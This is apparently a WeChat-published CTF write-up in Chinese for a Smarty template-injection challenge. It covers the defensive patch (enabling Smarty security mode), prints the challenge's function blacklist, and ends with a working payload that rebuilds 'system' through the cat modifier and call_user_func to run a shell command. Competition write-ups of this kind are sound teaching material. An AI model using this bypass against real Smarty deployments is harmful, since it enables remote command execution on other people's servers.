---
title: 首届“楚安杯”网络攻防高校邀请赛AWDP 第十轮smarty WP
url: https://mp.weixin.qq.com/s/ZdM-U4ry1LpQHLArp01Q7Q
source: Doonsec's feed
date: 2026-04-17
fetch_date: 2026-04-18T04:26:44.280908
---

# 首届“楚安杯”网络攻防高校邀请赛AWDP 第十轮smarty WP

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/8HibB35D4DH5wpTCcNJnoiaT186ibMsvehwNRicx7aHV4fNe22BSBAPrjfxicNCN2FpFrkepKAnj9SAtfJsS1ve5rLaQsibm5icMheicj1Ew8GFl5Jw/0?wx_fmt=jpeg)

# 首届“楚安杯”网络攻防高校邀请赛AWDP 第十轮smarty WP

原创

AWDP额头
AWDP额头

取证额头

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

2026年

第十轮

附件链接

```
通过网盘分享的文件：smarty.zip
链接: https://pan.baidu.com/s/1apzHf5CMTrpf4EAHMCGC8Q?pwd=v6j8 提取码: v6j8
```

题目 smarty

## 防御

直接在index.php内

```
$smarty=newSmarty();
```

下加上一行

```
$smarty->enableSecurity();
```

开启 Smarty 安全模式

编写update.sh

```
#!/bin/bash

cp index.php /var/www/html/index.php
```

wsl打开当前目录

```
tar zcvf update.tar.gz index.php update.sh
```

提交update.tar.gz，验证

## 攻击

阅览代码

```
<?php

functioncheckInput($input){

$blacklist=["^","~","%","file","fopen","fwriter","fput","copy","curl","fread","fget","function_exists","dl","putenv","system","exec","shell_exec","passthru","proc_open","proc_close","proc_get_status","checkdnsrr","getmxrr","getservbyname","getservbyport","syslog","popen","show_source","highlight_file","`","chmod","\$_","eval","copy","assert","usort","include","require","$"];

$input=str_replace("*/","* /",$input);

foreach($blacklistas$black){

if(stristr($input,$black))die("nonono");

}

return$input;

}

if($_SERVER['REQUEST_METHOD']==='POST'){

$templateName=checkInput($_POST['template_name']);

$templateContent=checkInput($_POST['template_content']);

// 将模板内容保存到 template.tpl 文件中

file_put_contents('./templates/template.tpl',$templateContent);

// 返回成功消息

$successMessage='模板已保存成功';

}

// 加载 Smarty 模板引擎库

require'./libs/Smarty.class.php';

$smarty=newSmarty();

$smarty->assign('success_message',$successMessage??'');

$smarty->assign('template_content',file_get_contents('./templates/template.tpl')??'');

$smarty->display('index.tpl');
```

我们需要过
blacklist 黑名单（外加防注释攻击），将我们填写的模板存到template.tpl，然后将index.tpl内容转成php，我们跟进到index.tpl

index.tpl

```
<!DOCTYPEhtml>

<html>

<head>

<title>Smarty 框架在线编辑预览</title>

<linkrel="stylesheet"href="https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/4.5.2/css/bootstrap.min.css">

    ……css忽略
</head>

<body>

<divclass="container-fluid">

<divclass="sidebar">

<h4>侧边栏</h4>

<ul>

<li><ahref="#edit">编辑模板</a></li>

<li><ahref="#preview">模板预览</a></li>

</ul>

</div>

<divclass="content">

<sectionid="edit">

<h2>编辑模板</h2>

<formmethod="POST"action="index.php">

<divclass="form-group">

<labelfor="template_name">模板名称</label>

<inputtype="text"class="form-control"id="template_name"name="template_name">

</div>

<divclass="form-group">

<labelfor="template_content">模板内容</label>

<textareaclass="form-control"id="template_content"name="template_content"rows="10"placeholder="在这里输入模板内容..."></textarea>

</div>

<buttontype="submit"class="btn btn-primary">保存模板</button>

</form>

</section>

<sectionid="preview"style="display: none;">

<h2>模板预览</h2>

<divid="previewContent">

                        {include file="./template.tpl"}

</div>

</section>

</div>

</div>

……忽略

</body>

</html>
```

根据上面的index.php猜测是SSTI，翻阅互联网，发现可以找关键词

```
$smarty->display('template.tpl');
或者
{includefile='template.tpl'}
```

在模板预览部分有一个类似的

```
{includefile="./template.tpl"}
```

文件包含，可以将我们所写进去的smarty转成php展示出来，那么可以执行php。

梳理一下攻击链，输入`template_content`，绕过WAF，然后点击模板预览来执行php

查看waf

```
$blacklist=["^","~","%","file","fopen","fwriter","fput","copy","curl","fread","fget","function_exists","dl","putenv","system","exec","shell_exec","passthru","proc_open","proc_close","proc_get_status","checkdnsrr","getmxrr","getservbyname","getservbyport","syslog","popen","show_source","highlight_file","`","chmod","\$_","eval","copy","assert","usort","include","require","$"];

$input=str_replace("*/","* /",$input);
```

不可以直接执行echo，system，fopen，带有file的readfile，文件包含等等，还有注释符绕过

```
sy/* 1111 */stem
```

查看smarty文档https://www.smarty.net/docs/zh\_CN/language.modifier.cat.tpl#/id412551

可以备一份https://www.smarty.net/files/docs/manual-zh\_CN-3.1.10.zip线下用

得知替代php的点是cat命令

构造playload

先测试

```
{{7*7}}
{{7*'7'}}

# 都输出49
```

```
{if phpinfo()}{/if}

# 有显示
```

```
{if call_user_func('sys'|cat:'tem','cat flag')}{/if}
```

点击模板预览获得flag

php.net/call\_user\_func
https://www.smarty.net/docs/zh\_CN/language.modifier.cat.tpl#/id412551

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/El9TntkKrphJHAd1oyZDnGENLvGnP3TZibRMPbtVILCIwJToFicNzBSsCNmicLtUZMnpEjekZNusABBsjE6ialyxZg/0?wx_fmt=png)

取证额头

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/El9TntkKrphJHAd1oyZDnGENLvGnP3TZibRMPbtVILCIwJToFicNzBSsCNmicLtUZMnpEjekZNusABBsjE6ialyxZg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过